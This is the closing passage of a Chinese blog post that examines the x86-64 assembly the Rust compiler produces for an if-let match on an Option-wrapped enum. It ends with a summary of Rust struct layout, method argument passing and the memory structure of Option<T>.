<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="title function_ invoke__">get_student</span>(<span class="number">4</span>, <span class="string">&quot;CoLin&quot;</span>.<span class="title function_ invoke__">to_string</span>());</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(Student::<span class="title function_ invoke__">Senior</span>(y)) = x &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        sub     rsp, 216</span><br><span class="line">        mov     byte ptr [rsp + 183], 0</span><br><span class="line">        lea     rdi, [rsp + 56]</span><br><span class="line">        lea     rsi, [rip + .L__unnamed_5]</span><br><span class="line">        mov     edx, 5</span><br><span class="line">        call    &lt;str as alloc::string::ToString&gt;::to_string</span><br><span class="line">        lea     rdi, [rsp + 24]</span><br><span class="line">        mov     esi, 4</span><br><span class="line">        lea     rdx, [rsp + 56]</span><br><span class="line">        call    qword ptr [rip + example::get_student@GOTPCREL]</span><br><span class="line">        mov     byte ptr [rsp + 183], 1</span><br><span class="line">        mov     eax, 1</span><br><span class="line">        xor     ecx, ecx</span><br><span class="line">        cmp     qword ptr [rsp + 24], 4</span><br><span class="line">        cmove   rax, rcx</span><br><span class="line">        cmp     rax, 1</span><br><span class="line">        jne     .LBB18_2</span><br><span class="line">        cmp     qword ptr [rsp + 24], 3</span><br><span class="line">        je      .LBB18_3</span><br></pre></td></tr></table></figure>
<p>可以发现，这里的判断逻辑和<code>match</code>是类似的，都是对枚举索引值进行比较。</p>
<h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1>
<p>本文学习了：</p>
<ol>
<li>Rust 结构体的内存排布以及结构体方法的参数传递，结构体方法参数传递遵照this参数传递法</li>
<li>Rust 枚举类型方法的参数传递与结构体方法的参数传递类似</li>
<li>Rust if-let语句的判断逻辑，<code>Option&lt;T&gt;</code>的内存结构</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/17/">17</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CoLin</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">161</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">26</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Hornos3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Hornos3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://blog.csdn.net/qq_54218833?spm=1000.2115.3001.5343" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_54218833?spm&#x3D;1000.2115.3001.5343" rel="noopener" target="_blank"><i class="fa fa-crosshairs fa-fw"></i>CSDN</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CoLin</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
      <span class="post-meta-item-text">站点总字数：</span>
    <span title="站点总字数">1.5m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">22:29</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
